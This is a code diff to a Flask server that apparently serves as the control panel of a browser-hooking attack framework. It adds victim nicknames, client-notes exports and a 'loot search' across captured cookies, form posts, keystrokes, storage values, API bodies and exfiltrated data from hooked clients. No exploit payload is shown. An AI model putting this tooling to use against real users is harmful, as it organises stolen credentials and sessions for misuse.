@@ -5,7 +5,7 @@ from werkzeug.middleware.proxy_fix import ProxyFix
 from flask_cors import CORS
 from markupsafe import Markup, escape
 from flask_sqlalchemy import SQLAlchemy
-from sqlalchemy import DateTime, func, event, create_engine, orm, Column, Integer, String, DateTime, Text, Boolean, update, UniqueConstraint
+from sqlalchemy import DateTime, func, event, create_engine, orm, Column, Integer, String, DateTime, Text, Boolean, update, UniqueConstraint, or_
 from sqlalchemy_utils import database_exists
 from sqlalchemy.engine import Engine
 from sqlalchemy.orm import scoped_session, sessionmaker, declarative_base
@@ -202,8 +202,28 @@ AdjectiveList = {
         "excited",
         "humorous",
         "charming",
-        "confident",
-        "fanatical"
+        "fanatical",
+        "grumpy",
+        "sneaky",
+        "rowdy",
+        "cheeky",
+        "jolly",
+        "dizzy",
+        "cranky",
+        "loopy",
+        "baffled",
+        "dramatic",
+        "feisty",
+        "savage",
+        "rabid",
+        "unhinged",
+        "feral",
+        "bonkers",
+        "maniacal",
+        "reckless",
+        "volatile",
+        "restless",
+        "legendary"
 }
 
 ColorList = {
@@ -227,7 +247,22 @@ ColorList = {
         "olive",
         "cyan",
         "ivory",
-        "magenta"
+        "magenta",
+        "teal",
+        "coral",
+        "scarlet",
+        "cobalt",
+        "amber",
+        "jade",
+        "copper",
+        "onyx",
+        "rust",
+        "indigo",
+        "charcoal",
+        "violet",
+        "khaki",
+        "slate",
+        "maroon"
 }
 
 
@@ -255,7 +290,23 @@ MurderCritter = {
         "echidna",
         "dugong",
         "sugarglider",
-        "blackswan"
+        "blackswan",
+        "huntsman",
+        "goanna",
+        "numbat",
+        "bilby",
+        "thornydevil",
+        "deathadder",
+        "irukandji",
+        "magpie",
+        "cockatoo",
+        "weta",
+        "bunyip",
+        "yowie",
+        "bluebottle",
+        "bandicoot",
+        "curlew",
+        "barramundi"
 }
 
 
@@ -1088,18 +1139,13 @@ def generateNickname():
     randomColor     = random.choice(list(ColorList))
     randomCritter   = random.choice(list(MurderCritter))
 
-    newNickname = randomAdjective + '-' + randomColor + '-' + randomCritter
+    baseNickname = randomAdjective + '-' + randomColor + '-' + randomCritter
+    newNickname  = baseNickname
 
     counter = 0
     while Client.query.filter_by(nickname=newNickname).count():
-        baseNickname = newNickname.replace('-'+ str(counter), '')
-        # logger.info("Base nickname created: " + baseNickname)
         counter += 1
-
-
         newNickname = baseNickname + '-' + str(counter)
-        # logger.info("Still looping for name, counter: " + str(counter))
-        # logger.info("Current newNickname: " + newNickname)
 
     return newNickname
 
@@ -1332,7 +1378,10 @@ def sendLootFile(path):
 @app.route('/protectedStatic/<path:path>')
 @login_required
 def sendProtectedStaticFile(path):
-    return send_from_directory('protectedStatic', path)
+    response = send_from_directory('protectedStatic', path)
+    if path.endswith('.js') or path.endswith('.css'):
+        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
+    return response
 
 
 
@@ -2023,7 +2072,7 @@ def createTaskResponse(identifier):
 
     dbChange = False
 
-    payloads = ClientPayloadJob.query.filter_by(clientKey=client.id).all()
+    payloads = ClientPayloadJob.query.filter_by(clientKey=client.id).order_by(ClientPayloadJob.id.asc()).all()
 
 
     taskedPayloads = [{'id':payload.id, 'data':payload.code} for payload in payloads]
@@ -3232,12 +3281,63 @@ def setClientNotes(key):
     return "ok", 200
 
 
+@app.route('/api/updateClientNickname/<key>', methods=['POST'])
+@login_required
+def setClientNickname(key):
+    content  = request.json
+    nickname = content.get('nickname', '').strip()
+
+    if not nickname:
+        return jsonify({'error': 'Nickname cannot be empty'}), 400
+
+    if len(nickname) > 60:
+        return jsonify({'error': 'Nickname must be 60 characters or fewer'}), 400
+
+    if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9 _\-\.]*$', nickname):
+        return jsonify({'error': 'Nickname must start with a letter or number and contain only letters, numbers, spaces, hyphens, underscores, and periods'}), 400
+
+    client = Client.query.filter_by(id=key).first()
+    if not client:
+        return jsonify({'error': 'Client not found'}), 404
+
+    # Check uniqueness (case-insensitive)
+    existing = Client.query.filter(Client.nickname == nickname, Client.id != int(key)).first()
+    if existing:
+        return jsonify({'error': 'Nickname "' + nickname + '" is already in use'}), 409
+
+    client.nickname = nickname
+    dbCommit()
+
+    return jsonify({'nickname': nickname}), 200
+
 
 @app.route('/api/allClientNotes', methods=['GET'])
 @login_required
 def getAllClientNotes():
     clients = Client.query.all()
-    allNoteData = [{'client':client.nickname, 'note':client.notes} for client in clients]
+    allNoteData = []
+    for client in clients:
+        if not client.notes:
+            continue
+
+        entry = {
+            'nickname':   client.nickname,
+            'tag':        client.tag or '',
+            'clientType': client.clientType,
+            'ipAddress':  client.ipAddress or '',
+            'platform':   client.platform or '',
+            'browser':    client.browser or '',
+            'firstSeen':  str(client.firstSeen) if client.firstSeen else '',
+            'lastSeen':   str(client.lastSeen) if client.lastSeen else '',
+            'note':       client.notes,
+        }
+
+        # Include domains for beacon clients
+        if client.clientType == 'bex-beacon':
+            domains = BeaconDomain.query.filter_by(clientID=client.uuid).all()
+            entry['domains'] = [d.domain for d in domains]
+
+        allNoteData.append(entry)
 
     return jsonify(allNoteData)
 
@@ -3978,6 +4078,311 @@ def deleteCustomPayload(key):
     dbCommit()
 
     return "ok", 200
+
+
+# Loot Search - cross-client content search
+def escape_like(s):
+    return s.replace('\\', '\\\\').replace('%', r'\%').replace('_', r'\_')
+
+
+@app.route('/api/lootSearch', methods=['POST'])
+@login_required
+def lootSearch():
+    content    = request.json
+    clientFilter = content.get('clientFilter', '').strip()
+    searchQuery  = content.get('searchQuery', '').strip()
+    eventTypes   = content.get('eventTypes', [])
+    sortOrder    = content.get('sortOrder', 'newest')
+    page         = content.get('page', 1)
+    perPage      = 50
+
+    # Phase 1: Filter clients
+    clients = Client.query.all()
+    if clientFilter:
+        terms = []
+        for t in clientFilter.split('&&'):
+            t = t.strip().lower()
+            if not t:
+                continue
+            negate = False
+            if t.startswith('!'):
+                negate = True
+                t = t[1:].strip()
+            if t:
+                terms.append({'term': t, 'negate': negate})
+
+        filtered = []
+        for c in clients:
+            haystack = ' '.join([
+                c.tag or '', c.nickname or '', c.ipAddress or '',
+                c.platform or '', c.browser or '',
+                c.clientType or '', c.domain or '', c.uuid or ''
+            ]).lower()
+            keep = True
+            for term in terms:
+                found = term['term'] in haystack
+                if term['negate'] and found:
+                    keep = False
+                    break
+                elif not term['negate'] and not found:
+                    keep = False
+                    break
+            if keep:
+                filtered.append(c)
+        clients = filtered
+
+    if not clients:
+        return jsonify({'results': [], 'total': 0, 'page': 1, 'pages': 0})
+
+    # Build lookup maps
+    clientByUuid = {c.uuid: c for c in clients}
+    clientById   = {c.id: c for c in clients}
+    uuids = list(clientByUuid.keys())
+
+    # For beacon events, find BeaconDomain IDs belonging to these clients
+    beaconDomainMap = {}  # domainID -> client
+    if any(et in eventTypes for et in ['BEACON_CAPTURE', 'BEACON_VISIT']):
+        domains = BeaconDomain.query.filter(BeaconDomain.clientID.in_(uuids)).all()
+        for d in domains:
+            beaconDomainMap[d.id] = clientByUuid.get(d.clientID)
+
+    escapedQuery = escape_like(searchQuery) if searchQuery else None
+    allResults = []
+
+    # Phase 2: Search loot tables
+    # Helper to add LIKE filters
+    def like_filter(col):
+        return col.ilike('%' + escapedQuery + '%', escape='\\')
+
+    # USERINPUT
+    if 'USERINPUT' in eventTypes:
+        q = UserInput.query.filter(UserInput.clientID.in_(uuids))
+        if escapedQuery:
+            q = q.filter(or_(like_filter(UserInput.inputName), like_filter(UserInput.inputValue)))
+        for r in q.all():
+            c = clientByUuid.get(r.clientID)
+            if c:
+                allResults.append({
+                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
+                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
+                    'clientId': c.id, 'eventType': 'USERINPUT',
+                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
+                    '_ts': r.timeStamp,
+                    'fields': {'Input Name': r.inputName, 'Input Value': r.inputValue}
+                })
+
+    # FORMPOST
+    if 'FORMPOST' in eventTypes:
+        q = FormPost.query.filter(FormPost.clientID.in_(uuids))
+        if escapedQuery:
+            q = q.filter(or_(
+                like_filter(FormPost.formName), like_filter(FormPost.formAction),
+                like_filter(FormPost.formData), like_filter(FormPost.url)
+            ))
+        for r in q.all():
+            c = clientByUuid.get(r.clientID)
+            if c:
+                allResults.append({
+                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
+                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
+                    'clientId': c.id, 'eventType': 'FORMPOST',
+                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
+                    '_ts': r.timeStamp,
+                    'fields': {'Form Name': r.formName or '', 'Form Action': r.formAction,
+                               'Form Data': r.formData or '', 'URL': r.url}
+                })
+
+    # COOKIE
+    if 'COOKIE' in eventTypes:
+        q = Cookie.query.filter(Cookie.clientID.in_(uuids))
+        if escapedQuery:
+            q = q.filter(or_(like_filter(Cookie.cookieName), like_filter(Cookie.cookieValue)))
+        for r in q.all():
+            c = clientByUuid.get(r.clientID)
+            if c:
+                allResults.append({
+                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
+                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
+                    'clientId': c.id, 'eventType': 'COOKIE',
+                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
+                    '_ts': r.timeStamp,
+                    'fields': {'Cookie Name': r.cookieName, 'Cookie Value': r.cookieValue}
+                })
+
+    # LOCALSTORAGE
+    if 'LOCALSTORAGE' in eventTypes:
+        q = LocalStorage.query.filter(LocalStorage.clientID.in_(uuids))
+        if escapedQuery:
+            q = q.filter(or_(like_filter(LocalStorage.key), like_filter(LocalStorage.value)))
+        for r in q.all():
+            c = clientByUuid.get(r.clientID)
+            if c:
+                allResults.append({
+                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
+                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
+                    'clientId': c.id, 'eventType': 'LOCALSTORAGE',
+                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
+                    '_ts': r.timeStamp,
+                    'fields': {'Key': r.key, 'Value': r.value}
+                })
+
+    # SESSIONSTORAGE
+    if 'SESSIONSTORAGE' in eventTypes:
+        q = SessionStorage.query.filter(SessionStorage.clientID.in_(uuids))
+        if escapedQuery:
+            q = q.filter(or_(like_filter(SessionStorage.key), like_filter(SessionStorage.value)))
+        for r in q.all():
+            c = clientByUuid.get(r.clientID)
+            if c:
+                allResults.append({
+                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
+                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
+                    'clientId': c.id, 'eventType': 'SESSIONSTORAGE',
+                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
+                    '_ts': r.timeStamp,
+                    'fields': {'Key': r.key, 'Value': r.value}
+                })
+
+    # URLVISITED
+    if 'URLVISITED' in eventTypes:
+        q = UrlVisited.query.filter(UrlVisited.clientID.in_(uuids))
+        if escapedQuery:
+            q = q.filter(like_filter(UrlVisited.url))
+        for r in q.all():
+            c = clientByUuid.get(r.clientID)
+            if c:
+                allResults.append({
+                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
+                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
+                    'clientId': c.id, 'eventType': 'URLVISITED',
+                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
+                    '_ts': r.timeStamp,
+                    'fields': {'URL': r.url}
+                })
+
+    # XHRAPICALL
+    if 'XHRAPICALL' in eventTypes:
+        q = XhrApiCall.query.filter(XhrApiCall.clientID.in_(uuids))
+        if escapedQuery:
+            q = q.filter(or_(
+                like_filter(XhrApiCall.url), like_filter(XhrApiCall.requestBody),
+                like_filter(XhrApiCall.responseBody)
+            ))
+        for r in q.all():
+            c = clientByUuid.get(r.clientID)
+            if c:
+                allResults.append({
+                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
+                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
+                    'clientId': c.id, 'eventType': 'XHRAPICALL',
+                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
+                    '_ts': r.timeStamp,
+                    'fields': {'URL': r.url, 'Request Body': r.requestBody or '',
+                               'Response Body': r.responseBody or ''}
+                })
+
+    # FETCHAPICALL
+    if 'FETCHAPICALL' in eventTypes:
+        q = FetchApiCall.query.filter(FetchApiCall.clientID.in_(uuids))
+        if escapedQuery:
+            q = q.filter(or_(
+                like_filter(FetchApiCall.url), like_filter(FetchApiCall.requestBody),
+                like_filter(FetchApiCall.responseBody)
+            ))
+        for r in q.all():
+            c = clientByUuid.get(r.clientID)
+            if c:
+                allResults.append({
+                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
+                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
+                    'clientId': c.id, 'eventType': 'FETCHAPICALL',
+                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
+                    '_ts': r.timeStamp,
+                    'fields': {'URL': r.url, 'Request Body': r.requestBody or '',
+                               'Response Body': r.responseBody or ''}
+                })
+
+    # CUSTOMEXFIL — linked through Event table (no clientID on CustomExfil)
+    if 'CUSTOMEXFIL' in eventTypes:
+        events = Event.query.filter(Event.clientID.in_(uuids), Event.eventType == 'CUSTOMEXFIL').all()
+        exfilIds = [e.eventID for e in events]
+        eventClientMap = {e.eventID: e.clientID for e in events}
+        if exfilIds:
+            q = CustomExfil.query.filter(CustomExfil.id.in_(exfilIds))
+            if escapedQuery:
+                q = q.filter(or_(like_filter(CustomExfil.note), like_filter(CustomExfil.data)))
+            for r in q.all():
+                cUuid = eventClientMap.get(r.id)
+                c = clientByUuid.get(cUuid) if cUuid else None
+                if c:
+                    allResults.append({
+                        'clientNickname': c.nickname, 'clientTag': c.tag or '',
+                        'clientType': c.clientType, 'clientIP': c.ipAddress or '',
+                        'clientId': c.id, 'eventType': 'CUSTOMEXFIL',
+                        'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
+                        '_ts': r.timeStamp,
+                        'fields': {'Note': r.note or '', 'Data': r.data or ''}
+                    })
+
+    # BEACON_CAPTURE
+    if 'BEACON_CAPTURE' in eventTypes and beaconDomainMap:
+        domainIds = list(beaconDomainMap.keys())
+        q = BeaconCapture.query.filter(BeaconCapture.domainID.in_(domainIds))
+        if escapedQuery:
+            q = q.filter(or_(like_filter(BeaconCapture.name), like_filter(BeaconCapture.value)))
+        for r in q.all():
+            c = beaconDomainMap.get(r.domainID)
+            if c:
+                allResults.append({
+                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
+                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
+                    'clientId': c.id, 'eventType': 'BEACON_CAPTURE',
+                    'timeStamp': r.capturedAt.strftime('%Y-%m-%d %H:%M:%S') if r.capturedAt else '',
+                    '_ts': r.capturedAt,
+                    'fields': {'Name': r.name, 'Value': r.value}
+                })
+
+    # BEACON_VISIT
+    if 'BEACON_VISIT' in eventTypes and beaconDomainMap:
+        domainIds = list(beaconDomainMap.keys())
+        q = BeaconVisit.query.filter(BeaconVisit.domainID.in_(domainIds))
+        if escapedQuery:
+            q = q.filter(like_filter(BeaconVisit.url))
+        for r in q.all():
+            c = beaconDomainMap.get(r.domainID)
+            if c:
+                allResults.append({
+                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
+                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
+                    'clientId': c.id, 'eventType': 'BEACON_VISIT',
+                    'timeStamp': r.visitTime.strftime('%Y-%m-%d %H:%M:%S') if r.visitTime else '',
+                    '_ts': r.visitTime,
+                    'fields': {'URL': r.url}
+                })
+
+    # Sort by timestamp
+    descending = (sortOrder != 'oldest')
+    allResults.sort(key=lambda x: x.get('_ts') or datetime.datetime.min, reverse=descending)
+
+    # Remove internal sort key
+    for r in allResults:
+        r.pop('_ts', None)
+
+    # Paginate
+    total = len(allResults)
+    pages = (total + perPage - 1) // perPage if total > 0 else 0
+    start = (page - 1) * perPage
+    end   = start + perPage
+    pageResults = allResults[start:end]
+
+    return jsonify({
+        'results': pageResults,
+        'total': total,
+        'page': page,
+        'pages': pages,
+        'sortOrder': sortOrder
+    })
+
 
 #**************************************************************************
 
